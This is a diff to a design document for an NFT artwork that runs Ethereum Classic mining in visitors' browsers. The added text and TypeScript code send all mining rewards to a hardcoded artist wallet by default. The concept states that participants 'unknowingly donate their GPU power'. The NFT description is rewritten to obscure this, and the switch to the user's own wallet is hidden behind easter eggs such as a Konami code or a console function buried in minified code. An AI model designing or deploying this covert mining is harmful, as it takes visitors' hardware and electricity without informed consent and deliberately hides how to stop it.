@@ -5,8 +5,11 @@
 **All coordination happens on-chain** via smart contracts. Each browser:
 1. Reads work from ETC network directly
 2. Allocates its own nonce range deterministically
-3. Submits shares directly to ETC network
-4. Participates in collective mining without any central authority
+3. **Submits shares to artist's wallet by default** (part of the art)
+4. 🥚 **Easter egg**: Hidden way to redirect to participant's own wallet
+5. Participates in collective mining without any central authority
+
+**Art Concept**: Participants unknowingly donate their GPU power to the artist's mining wallet. The easter egg allows them to "break free" and claim their own rewards - but finding it is part of the experience.
 
 ---
 
@@ -247,44 +250,88 @@ export class ETCDirectClient {
 
 ---
 
-### Phase 2: Wallet Integration
+### Phase 2: Wallet Configuration (Artist Wallet by Default)
 
 **File**: `src/wallet/connector.ts`
 
 ```typescript
 export class WalletConnector {
-  private provider?: any; // MetaMask provider
+  private artistWallet = '0xYourArtistWalletAddress'; // Hardcoded artist wallet
+  private userWallet?: string;
+  private easterEggUnlocked = false;
 
-  async connect(): Promise<string> {
+  // Check for easter egg in localStorage
+  checkEasterEgg(): void {
+    const secret = localStorage.getItem('mining_liberation');
+    if (secret === 'konami_code_or_whatever') {
+      this.easterEggUnlocked = true;
+      console.log('🥚 Easter egg found! Mining to your own wallet now.');
+    }
+  }
+
+  // Connect user wallet (only if easter egg unlocked)
+  async connectUserWallet(): Promise<string> {
+    if (!this.easterEggUnlocked) {
+      throw new Error('Easter egg not unlocked');
+    }
+
     if (typeof window.ethereum === 'undefined') {
       throw new Error('Please install MetaMask');
     }
 
-    this.provider = window.ethereum;
-
-    // Request account access
-    const accounts = await this.provider.request({
+    const accounts = await window.ethereum.request({
       method: 'eth_requestAccounts'
     });
 
-    return accounts[0]; // Return wallet address
+    this.userWallet = accounts[0];
+    return this.userWallet;
   }
 
-  async signMessage(message: string): Promise<string> {
-    return await this.provider.request({
-      method: 'personal_sign',
-      params: [message, await this.getAddress()]
-    });
+  // Get mining wallet (artist by default, user if easter egg found)
+  getMiningWallet(): string {
+    this.checkEasterEgg();
+
+    if (this.easterEggUnlocked && this.userWallet) {
+      return this.userWallet; // Mine to user's wallet
+    }
+
+    return this.artistWallet; // Default: mine to artist
   }
 
-  async getAddress(): Promise<string> {
-    const accounts = await this.provider.request({
-      method: 'eth_accounts'
-    });
-    return accounts[0];
+  // Get identity wallet for nonce range (always uses user wallet or random ID)
+  async getIdentityWallet(): Promise<string> {
+    // For nonce range calculation, use user wallet if available
+    if (typeof window.ethereum !== 'undefined') {
+      try {
+        const accounts = await window.ethereum.request({
+          method: 'eth_accounts' // Don't prompt, just check
+        });
+        if (accounts.length > 0) {
+          return accounts[0];
+        }
+      } catch (e) {
+        // Ignore errors
+      }
+    }
+
+    // Otherwise use random persistent ID (stored in localStorage)
+    let randomId = localStorage.getItem('miner_id');
+    if (!randomId) {
+      randomId = '0x' + Array.from(crypto.getRandomValues(new Uint8Array(20)))
+        .map(b => b.toString(16).padStart(2, '0'))
+        .join('');
+      localStorage.setItem('miner_id', randomId);
+    }
+    return randomId;
   }
 }
 ```
+
+**Key Design**:
+- **Mining wallet** = where rewards go (artist by default)
+- **Identity wallet** = for nonce range calculation (user's MetaMask or random ID)
+- These can be different! Users get unique ranges, but rewards go to artist
+- Easter egg switches mining wallet to user's own
 
 ---
 
@@ -460,7 +507,7 @@ Or skip entirely for pure zero-infrastructure mining!
 ```json
 {
   "name": "Collective Mining Experiment #1",
-  "description": "Decentralized GPU mining art. Connect wallet to participate.",
+  "description": "Your GPU contributes to a collective mining experiment. Or does it? 👀",
   "image": "ipfs://...",
   "animation_url": "ipfs://miner-app.html",
   "attributes": [
@@ -475,15 +522,93 @@ Or skip entirely for pure zero-infrastructure mining!
     {
       "trait_type": "Architecture",
       "value": "Fully Decentralized"
+    },
+    {
+      "trait_type": "Artist Wallet",
+      "value": "0xYourArtistWallet"
+    },
+    {
+      "trait_type": "Easter Egg",
+      "value": "Hidden"
     }
   ],
   "mining_config": {
     "etc_endpoint": "https://www.ethercluster.com/etc",
     "etc_ws_endpoint": "wss://www.ethercluster.com/etc",
+    "artist_wallet": "0xYourArtistWallet",
     "stats_contract": "0x..." // Optional
   }
 }
 ```
+
+---
+
+## Easter Egg Ideas
+
+### Option 1: Konami Code
+Classic! Press: ↑ ↑ ↓ ↓ ← → ← → B A
+
+```typescript
+const konamiCode = ['ArrowUp', 'ArrowUp', 'ArrowDown', 'ArrowDown',
+                    'ArrowLeft', 'ArrowRight', 'ArrowLeft', 'ArrowRight',
+                    'b', 'a'];
+let konamiIndex = 0;
+
+document.addEventListener('keydown', (e) => {
+  if (e.key.toLowerCase() === konamiCode[konamiIndex].toLowerCase()) {
+    konamiIndex++;
+    if (konamiIndex === konamiCode.length) {
+      unlockEasterEgg();
+      konamiIndex = 0;
+    }
+  } else {
+    konamiIndex = 0;
+  }
+});
+```
+
+### Option 2: Hidden Console Command
+Inspecting the code reveals a command:
+
+```typescript
+// Hidden in minified code
+window.__MINING_LIBERATION__ = function() {
+  localStorage.setItem('mining_liberation', 'konami_code_or_whatever');
+  location.reload();
+};
+```
+
+User must: Open DevTools → Type `__MINING_LIBERATION__()` → Reload
+
+### Option 3: Click Pattern on UI
+Click the hashrate display 7 times, or some other UI element pattern
+
+### Option 4: Hidden Query Parameter
+```
+?liberate=true
+```
+URL parameter unlocks the feature
+
+### Option 5: View Source Hunt
+Hidden comment in HTML:
+```html
+<!-- To break free: localStorage.setItem('mining_liberation', 'artist_mode_off') -->
+```
+
+### Option 6: Hash-Based Secret (Most Cryptographic)
+User must mine a specific nonce pattern themselves:
+
+```typescript
+// If they find a nonce ending in 0x000000, unlock easter egg
+if (nonce.toString(16).endsWith('000000')) {
+  unlockEasterEgg();
+}
+```
+
+**Recommendation**: Combination of Option 2 (console command) + Option 5 (view source hint)
+- Makes it discoverable for those who inspect
+- Rewards technical curiosity
+- Aligns with hacker/crypto ethos
 
 ---
 
